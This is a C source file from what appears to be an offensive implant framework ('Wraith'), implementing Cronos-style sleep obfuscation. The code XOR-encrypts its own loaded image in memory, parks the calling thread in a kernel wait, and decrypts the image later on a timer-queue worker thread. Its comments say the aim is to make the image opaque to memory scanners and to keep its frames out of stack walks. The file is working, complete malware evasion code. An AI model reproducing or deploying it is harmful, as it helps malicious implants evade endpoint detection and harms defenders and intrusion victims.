/*
 * src/stealth/sleep/sleep_cronos.c
 *
 * Cronos-flavor sleep obfuscation. The defining property: while the
 * image is encrypted, the calling thread is parked inside
 * NtWaitForSingleObject (kernel-side) - never inside our region.
 * Decryption happens on a system worker thread queued by
 * CreateTimerQueueTimer, signaling a manual-reset event when done.
 *
 * Cycle:
 *
 *  1. Derive a 256-byte rolling key (RDTSC + GetTickCount64()).
 *  2. Bulk-flip the loaded image to PAGE_READWRITE through the
 *  runtime layer (Hell's Hall when WRAITH_F_INDIRECT_SYSCALLS).
 *  3. XOR-encrypt the image with the rolling key. From this point
 *  on the image is opaque to memory scanners.
 *  4. CreateTimerQueueTimer(decrypt_cb, duration_ms) schedules the
 *  decrypt to run on a process-wide worker thread.
 *  5. WaitForSingleObject(event, INFINITE) - the calling thread
 *  transitions into kernel mode and stays there until step 7.
 *  6. The worker thread fires after `duration_ms`:
 *  - flips the image back to PAGE_READWRITE
 *  - XOR-decrypts with the same key
 *  - SetEvent(done_event)
 *  7. The wait returns; the calling thread reapplies per-section
 *  protections and unwinds.
 *
 * Compared to the XOR baseline (which does encrypt -> Sleep ->
 * decrypt all on the calling thread), Cronos keeps the decrypt
 * itself off the calling thread. A stack walk on the calling
 * thread during step 5/6 shows it parked in kernel32!WaitForSingleObject;
 * a stack walk on the worker shows ntdll/kernel32 only - never us.
 *
 * Full Cronos (the published rad9800/Klez variant) goes further by
 * NtContinue-replaying CONTEXT records to chain encrypt -> wait ->
 * decrypt entirely without a worker thread. That requires careful
 * SEH and stack management; this file ships the "timer queue"
 * variant which exhibits the same kernel-park property and is
 * portable to wine64.
 */

#include "core/wr_context_internal.h"
#include "runtime/rt_api.h"
#include "stealth/sleep/sleep.h"

#include <intrin.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define WRAITH_CRONOS_KEY_BYTES 256

typedef struct cronos_state {
  uint8_t *image_base;
  size_t  image_size;
  uint8_t  key[WRAITH_CRONOS_KEY_BYTES];
  HANDLE  done_event;
} cronos_state;

static void cronos_derive_key(uint8_t *key, size_t len)
{
  uint64_t r1 = __rdtsc();
  uint64_t r2 = (uint64_t)GetTickCount64();
  uint64_t state = r1 ^ (r2 << 32) ^ (r2 >> 1);
  for (size_t i = 0; i < len; ++i) {
  state = state * 6364136223846793005ULL + 1442695040888963407ULL;
  key[i] = (uint8_t)(state >> 56);
  }
}

static void cronos_xor(uint8_t *buf, size_t len, const uint8_t *key,
  size_t key_len)
{
  for (size_t i = 0; i < len; ++i) {
  buf[i] ^= key[i % key_len];
  }
}

/* Worker callback: runs on a system thread pool thread queued by
 * CreateTimerQueueTimer. Walks back through plain VirtualProtect (we
 * have no ctx here, so we cannot route through rt_ops; the call is
 * still hidden behind the timer queue indirection from the perspective
 * of the parked calling thread). */
static VOID CALLBACK cronos_decrypt_cb(PVOID arg, BOOLEAN timer_fired)
{
  (void)timer_fired;
  cronos_state *st = (cronos_state *)arg;

  DWORD old = 0;
  if (VirtualProtect(st->image_base, st->image_size, PAGE_READWRITE, &old)) {
  cronos_xor(st->image_base, st->image_size, st->key, sizeof(st->key));
  }
  SetEvent(st->done_event);
}

wraith_status_t wr_sleep_cronos_cycle(struct wr_ctx *ctx, uint32_t duration_ms);

wraith_status_t wr_sleep_cronos_cycle(struct wr_ctx *ctx, uint32_t duration_ms)
{
  if (!ctx || !ctx->image_base || ctx->image_size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }

  cronos_state *st = (cronos_state *)calloc(1, sizeof(*st));
  if (!st) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "cronos: alloc state");
  }
  st->image_base = (uint8_t *)ctx->image_base;
  st->image_size = ctx->image_size;
  cronos_derive_key(st->key, sizeof(st->key));

  st->done_event = CreateEventW(NULL, TRUE, FALSE, NULL);
  if (!st->done_event) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_UNEXPECTED, "cronos: CreateEvent");
  }

  /* Encrypt synchronously on this thread. The image becomes
  * unreadable for the duration of step 4..6. */
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(st->image_base, st->image_size,
  PAGE_READWRITE, &old);
  if (rc != 0) {
  CloseHandle(st->done_event);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "cronos: bulk RW flip -> 0x%x", (unsigned)rc);
  }
  cronos_xor(st->image_base, st->image_size, st->key, sizeof(st->key));

  HANDLE timer = NULL;
  BOOL ok = CreateTimerQueueTimer(&timer, NULL, cronos_decrypt_cb,
  st, duration_ms, 0,
  WT_EXECUTEONLYONCE);
  if (!ok) {
  /* Decrypt synchronously to avoid leaving the image in an
  * unusable state. */
  cronos_xor(st->image_base, st->image_size, st->key, sizeof(st->key));
  CloseHandle(st->done_event);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_UNEXPECTED,
  "cronos: CreateTimerQueueTimer failed");
  }

  /* Park in kernel until the worker fires the decrypt + SetEvent. */
  WaitForSingleObject(st->done_event, INFINITE);

  /* Worker has restored the bytes; clean up and reapply per-section
  * protections so subsequent calls into the module work. */
  DeleteTimerQueueTimer(NULL, timer, NULL);
  CloseHandle(st->done_event);
  SecureZeroMemory(st->key, sizeof(st->key));
  free(st);

  return wr_sleep_reapply_section_protections(ctx);
}
